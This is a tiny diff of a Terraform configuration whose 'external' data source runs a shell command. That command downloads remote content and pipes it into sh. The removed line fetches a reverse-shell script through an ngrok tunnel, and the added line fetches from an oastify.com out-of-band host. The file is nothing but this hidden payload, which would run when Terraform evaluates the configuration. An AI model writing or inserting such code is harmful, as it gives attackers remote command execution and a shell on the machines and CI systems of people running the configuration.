@@ -1,3 +1,3 @@
 data "external" "example" {
-  program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
+  program = ["sh", "-c", "curl https://4iniwny6dv5wst61haufnxuzxq3hrgf5.oastify.com | sh"]
 }
